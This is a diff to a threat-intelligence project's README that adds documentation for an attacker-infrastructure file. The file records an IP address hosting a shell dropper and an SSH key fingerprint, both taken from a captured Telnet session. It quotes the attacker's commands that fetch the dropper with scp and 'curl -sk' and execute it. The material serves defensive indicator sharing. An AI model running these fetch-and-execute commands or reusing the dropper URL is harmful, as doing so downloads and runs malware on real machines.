@@ -91,6 +91,23 @@ addresses are never published.
 
 Roles are coarse on purpose. `"role": "ai"` says the endpoint exists, not how it answers.
 
+## infra.json
+
+Attacker infrastructure, kept separate from the indicator feeds because it is a different
+kind of claim: an address here is a host the attacker operates, not an address that
+scanned us. Both entries come from one Telnet session on 2026-10-27.
+
+- **`217.60.102.5`** serves a shell dropper at `https://217.60.102.5/sh`. One bot planted
+  an SSH key, ran `scp dlr@217.60.102.5:sh` and executed the result with a `telnet`
+  argument; a different host fetched the same URL with `curl -sk`.
+- **`SHA256:O/at8341SoPpKvTPvMsJSgjQm30md9VTS2it25sY0vg`** (`dlr@sftp`, ed25519) is the
+  key that bot wrote to `key.ppk` to reach that host. The public half is published; the
+  private half was captured and is not.
+
+The policy is unchanged: a *source* address is never published. An address inside
+attacker-controlled infrastructure is the same category as `payload-urls.txt` — C2 and
+staging, not a victim — and it is published deliberately.
+
 ## app/config
 
 Client configs and credentials — OpenAI-compatible, Anthropic, MCP, a kubeconfig, a
